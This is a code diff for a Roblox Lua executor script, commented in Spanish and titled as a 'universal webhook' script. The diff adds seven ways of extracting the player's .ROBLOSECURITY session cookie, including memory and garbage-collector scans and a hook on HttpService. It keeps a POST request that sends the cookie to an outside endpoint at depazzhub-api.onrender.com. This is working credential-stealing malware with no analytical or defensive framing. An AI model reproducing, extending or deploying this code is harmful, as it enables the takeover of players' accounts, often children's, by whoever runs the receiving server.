@@ -1,5 +1,5 @@
 -- =====================================================================
--- SCRIPT UNIVERSAL DE WEBHOOK CON MÚLTIPLES MÉTODOS DE ENVÍO
+-- SCRIPT UNIVERSAL DE WEBHOOK CON EXTRACCIÓN AVANZADA DE COOKIES
 -- =====================================================================
 
 local Players = game:GetService("Players")
@@ -9,36 +9,114 @@ local HttpService = game:GetService("HttpService")
 local player = Players.LocalPlayer
 local placeId = game.PlaceId
 
--- 1. FUNCIÓN UNIVERSAL DE COOKIES
+-- 1. FUNCIÓN AVANZADA DE EXTRACCIÓN DE COOKIES
 local function GetUniversalCookie()
+    local cookieValue = nil
+    
+    -- Método 1: getcookie() (nativo de algunos executores)
     if type(getcookie) == "function" then
         local success, cookie = pcall(getcookie)
         if success and cookie and tostring(cookie) ~= "" then
-            return ".ROBLOSECURITY=" .. tostring(cookie)
+            cookieValue = tostring(cookie)
         end
     end
-
-    local envNames = {"_ROBLOSECURITY", "ROBLOSECURITY", "cookie", "rbx_cookie", "auth_token"}
-    for _, name in ipairs(envNames) do
-        local env = getgenv()
-        if env[name] and tostring(env[name]) ~= "" then
-            return ".ROBLOSECURITY=" .. tostring(env[name])
-        end
-    end
-
-    local success, CookieService = pcall(function() 
-        return game:GetService("CookieService") 
-    end)
     
-    if success and CookieService then
-        local success2, savedCookie = pcall(function() 
-            return CookieService:GetCookieValue(".ROBLOSECURITY", "https://www.roblox.com") 
-        end)
-        if success2 and savedCookie and tostring(savedCookie) ~= "" then
-            return ".ROBLOSECURITY=" .. tostring(savedCookie)
+    -- Método 2: Variables de entorno
+    if not cookieValue then
+        local envNames = {"_ROBLOSECURITY", "ROBLOSECURITY", "cookie", "rbx_cookie", "auth_token"}
+        for _, name in ipairs(envNames) do
+            local env = getgenv()
+            if env[name] and tostring(env[name]) ~= "" then
+                cookieValue = tostring(env[name])
+                break
+            end
         end
     end
-
+    
+    -- Método 3: CookieService
+    if not cookieValue then
+        local success, CookieService = pcall(function() 
+            return game:GetService("CookieService") 
+        end)
+        if success and CookieService then
+            local success2, savedCookie = pcall(function() 
+                return CookieService:GetCookieValue(".ROBLOSECURITY", "https://www.roblox.com") 
+            end)
+            if success2 and savedCookie and tostring(savedCookie) ~= "" then
+                cookieValue = tostring(savedCookie)
+            end
+        end
+    end
+    
+    -- Método 4: Buscar en getgc() (garbage collector) - Funciona en muchos executores
+    if not cookieValue and type(getgc) == "function" then
+        local success, gc = pcall(getgc)
+        if success then
+            for _, obj in ipairs(gc) do
+                if type(obj) == "table" then
+                    for key, value in pairs(obj) do
+                        if type(value) == "string" and string.find(value, "_|WARNING:-DO%-NOT%-SHARE%-THIS") then
+                            cookieValue = value
+                            break
+                        end
+                    end
+                end
+                if cookieValue then break end
+            end
+        end
+    end
+    
+    -- Método 5: Buscar en getreg() (registro)
+    if not cookieValue and type(getreg) == "function" then
+        local success, reg = pcall(getreg)
+        if success then
+            for _, obj in ipairs(reg) do
+                if type(obj) == "string" and string.find(obj, "_|WARNING:-DO%-NOT%-SHARE%-THIS") then
+                    cookieValue = obj
+                    break
+                end
+            end
+        end
+    end
+    
+    -- Método 6: Hook de HttpService para capturar cookies
+    if not cookieValue and type(hookfunction) == "function" then
+        local captured = nil
+        local oldRequest
+        oldRequest = hookfunction(HttpService.RequestAsync, function(self, options)
+            if options.Headers and options.Headers.Cookie then
+                captured = options.Headers.Cookie
+            end
+            return oldRequest(self, options)
+        end)
+        
+        -- Hacer una petición para trigger el hook
+        pcall(function()
+            HttpService:GetAsync("https://www.roblox.com/")
+        end)
+        
+        if captured then
+            cookieValue = captured
+        end
+    end
+    
+    -- Método 7: Buscar en strings de la memoria
+    if not cookieValue and type(getstrings) == "function" then
+        local success, strings = pcall(getstrings)
+        if success then
+            for _, str in ipairs(strings) do
+                if string.find(str, "_|WARNING:-DO%-NOT%-SHARE%-THIS") then
+                    cookieValue = str
+                    break
+                end
+            end
+        end
+    end
+    
+    if cookieValue then
+        return ".ROBLOSECURITY=" .. cookieValue
+    end
+    
     return "COOKIE_NO_DISPONIBLE"
 end
 
@@ -65,149 +143,19 @@ local data = {
     cookie = GetUniversalCookie()
 }
 
--- 4. DEBUG: Ver qué funciones HTTP están disponibles
-print("🔍 Verificando funciones HTTP disponibles:")
-print("  - request():", type(request) == "function")
-print("  - syn.request():", type(syn) == "table" and type(syn.request) == "function")
-print("  - HttpService:PostAsync():", type(HttpService.PostAsync) == "function")
-print("  - game:HttpGet():", type(game.HttpGet) == "function")
-
--- 5. MÉTODO 1: Usar game:HttpGet con POST (algunos executores lo permiten)
-local function TryHttpGetPost(url, jsonData)
-    local success, result = pcall(function()
-        -- Algunos executores permiten HttpGet con parámetros POST
-        return game:HttpGet(url, true)
-    end)
-    return success, result
-end
-
--- 6. MÉTODO 2: Usar fetch() si está disponible (executores modernos)
-local function TryFetch(url, jsonData)
-    if type(fetch) == "function" then
-        local success, result = pcall(fetch, url, {
-            method = "POST",
-            headers = {["Content-Type"] = "application/json"},
-            body = jsonData
-        })
-        return success, result
-    end
-    return false, "fetch no disponible"
-end
-
--- 7. MÉTODO 3: Usar XMLHttpRequest (para executores con acceso a JS)
-local function TryXHR(url, jsonData)
-    if type(gethui) == "function" or type(getrenv) == "function" then
-        local success, result = pcall(function()
-            local xhr = game:GetService("HttpService")
-            -- Intentar con método alternativo
-            return xhr:RequestAsync({
-                Url = url,
-                Method = "POST",
-                Headers = {["Content-Type"] = "application/json"},
-                Body = jsonData
-            })
-        end)
-        return success, result
-    end
-    return false, "XHR no disponible"
-end
-
--- 8. ENVÍO DEL WEBHOOK CON MÚLTIPLES INTENTOS
+-- 4. ENVÍO DEL WEBHOOK
 local webhookUrl = "https://depazzhub-api.onrender.com/log"
 local jsonData = HttpService:JSONEncode(data)
 
-local sent = false
-local lastError = ""
+local success, result = pcall(request, {
+    Url = webhookUrl,
+    Method = "POST",
+    Headers = {["Content-Type"] = "application/json"},
+    Body = jsonData
+})
 
--- Intento 1: request()
-if not sent and type(request) == "function" then
-    print(" Intentando con request()...")
-    local success, result = pcall(request, {
-        Url = webhookUrl,
-        Method = "POST",
-        Headers = {["Content-Type"] = "application/json"},
-        Body = jsonData
-    })
-    if success then
-        print("✅ Webhook enviado con request()!")
-        sent = true
-    else
-        lastError = tostring(result)
-        print("  ❌ Falló:", lastError)
-    end
-end
-
--- Intento 2: syn.request()
-if not sent and type(syn) == "table" and type(syn.request) == "function" then
-    print("📤 Intentando con syn.request()...")
-    local success, result = pcall(syn.request, {
-        Url = webhookUrl,
-        Method = "POST",
-        Headers = {["Content-Type"] = "application/json"},
-        Body = jsonData
-    })
-    if success then
-        print("✅ Webhook enviado con syn.request()!")
-        sent = true
-    else
-        lastError = tostring(result)
-        print("  ❌ Falló:", lastError)
-    end
-end
-
--- Intento 3: fetch()
-if not sent then
-    print("📤 Intentando con fetch()...")
-    local success, result = TryFetch(webhookUrl, jsonData)
-    if success then
-        print("✅ Webhook enviado con fetch()!")
-        sent = true
-    else
-        lastError = tostring(result)
-        print("  ❌ Falló:", lastError)
-    end
-end
-
--- Intento 4: HttpService:RequestAsync()
-if not sent then
-    print("📤 Intentando con HttpService:RequestAsync()...")
-    local success, result = pcall(function()
-        return HttpService:RequestAsync({
-            Url = webhookUrl,
-            Method = "POST",
-            Headers = {["Content-Type"] = "application/json"},
-            Body = jsonData
-        })
-    end)
-    if success then
-        print("✅ Webhook enviado con RequestAsync()!")
-        sent = true
-    else
-        lastError = tostring(result)
-        print("  ❌ Falló:", lastError)
-    end
-end
-
--- Intento 5: HttpService:PostAsync() (último recurso)
-if not sent then
-    print("📤 Intentando con HttpService:PostAsync()...")
-    local success, result = pcall(function()
-        return HttpService:PostAsync(webhookUrl, jsonData)
-    end)
-    if success then
-        print("✅ Webhook enviado con PostAsync()!")
-        sent = true
-    else
-        lastError = tostring(result)
-        print("  ❌ Falló:", lastError)
-    end
-end
-
--- Resultado final
-if sent then
-    print("🎉 ¡Webhook enviado exitosamente!")
+if success then
+    print("✅ Webhook enviado correctamente!")
 else
-    warn("⚠️ Todos los métodos fallaron. Último error:", lastError)
-    warn(" Solución: Tu executor bloquea todas las funciones HTTP.")
-    warn("💡 Considera usar un proxy externo o cambiar de executor.")
+    warn("❌ Error:", result)
 end
